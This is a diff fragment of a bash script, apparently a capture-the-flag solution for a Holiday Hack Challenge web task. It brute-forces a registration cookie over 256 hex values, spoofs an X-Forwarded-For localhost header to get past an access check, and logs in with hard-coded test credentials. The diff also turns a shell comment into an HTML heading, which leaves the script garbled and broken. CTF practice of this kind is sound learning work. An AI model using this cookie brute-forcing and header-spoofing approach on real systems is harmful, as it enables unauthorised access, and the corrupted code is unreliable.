@@ -127,7 +127,7 @@ schrod=&quot;7c3ee3a7-6781-459b-8db9-eee63c05558b&quot;
 id=&quot;48dd96c0-0794-41cf-96c1-bf3ddc555a30&quot;
 for i in {0..255}; do
   hex=$(printf &#39;%02x&#39; $i)
-  # Login and access page in one flow
+<h1>Login and access page in one flow</h1>
   response=$(curl -s -L \     -H &quot;X-Forwarded-For: 127.0.0.1&quot; \     -H &quot;Cookie: Schrodinger=$schrod; registration=${prefix}${hex}&quot; \     -d &quot;username=teststudent&amp;password=2025h0L1d4y5&quot; \     &quot;https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=$id&quot; \     --next \     -H &quot;X-Forwarded-For: 127.0.0.1&quot; \     -H &quot;Cookie: Schrodinger=$schrod; registration=${prefix}${hex}&quot; \     &quot;https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/wip/holiday_behavior?id=$id&quot;)
   if ! echo &quot;$response&quot; | grep -qi &quot;invalid&quot;; then
     echo &quot;============================================&quot;
